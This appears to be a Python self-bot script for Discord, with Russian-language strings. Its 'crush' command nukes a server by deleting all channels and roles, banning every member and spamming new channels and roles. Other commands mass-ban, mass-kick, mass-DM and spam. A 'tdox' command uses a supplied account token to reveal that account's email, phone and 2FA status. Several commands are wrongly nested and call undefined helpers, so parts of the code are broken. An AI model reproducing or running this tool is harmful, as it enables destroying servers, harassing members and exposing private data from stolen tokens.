import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging
from discord.ext import commands
import config

prefix = config.PREFIX
token = config.TOKEN


#prefix
client = commands.Bot(command_prefix = prefix, self_bot = True )




@client.command()
async def say(ctx, *, text):
    await ctx.send(embed = discord.Embed(description = text))

@client.event
async def on_ready():
    print('Я крч запустился. А селф бота написал eLemeLkya#8888')

@client.command()
async def crush(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name='MEGA CRUSH',
            description="SELF BOT BY ELEMELKYA",
            reason="ELEMELKYA",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(50):
        await ctx.guild.create_text_channel(name='ELEMELKYA')
    for _i in range(50):
        await ctx.guild.create_role(name='ELEMELKYA')

    @client.command()
    async def dmall(ctx, *, message): # b'\xfc'
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await asyncio.sleep(5)    
                await user.send(message)
            except:
                pass

    @client.command()
    async def massban(ctx): # b'\xfc'
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass    

    @client.command()
    async def masskick(ctx): # b'\xfc'
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.kick()
            except:
                pass    

    @client.command()
    async def massrole(ctx): # b'\xfc'
        await ctx.message.delete()
        for _i in range(250):
            try:
                await ctx.guild.create_role(name=RandString(), color=RandomColor())
            except:
                return    

    @client.command()
    async def masschannel(ctx): # b'\xfc'
        await ctx.message.delete()
        for _i in range(250):
            try:
                await ctx.guild.create_text_channel(name=RandString())
            except:
                return

    @client.command()
    async def delchannels(ctx): # b'\xfc'
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                return

    @client.command() 
    async def delroles(ctx): # b'\xfc'
        await ctx.message.delete()
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass

    @client.command()
    async def massunban(ctx): # b'\xfc'
        await ctx.message.delete()    
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await asyncio.sleep(2)
                await ctx.guild.unban(user=users.user)
            except:
                pass

    @client.command()
    async def spam(ctx, amount: int, *, message): # b'\xfc'
        await ctx.message.delete()    
        for _i in range(amount):
            await ctx.send(message)


@client.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Имя: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Телефон', 'value': res['phone']},
        {'name': 'Флаги', 'value': res['flags']},
        {'name': '2FA?', 'value': res['mfa_enabled']},
        {'name': 'Подтвержден?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


# Run
client.run(token, bot = False)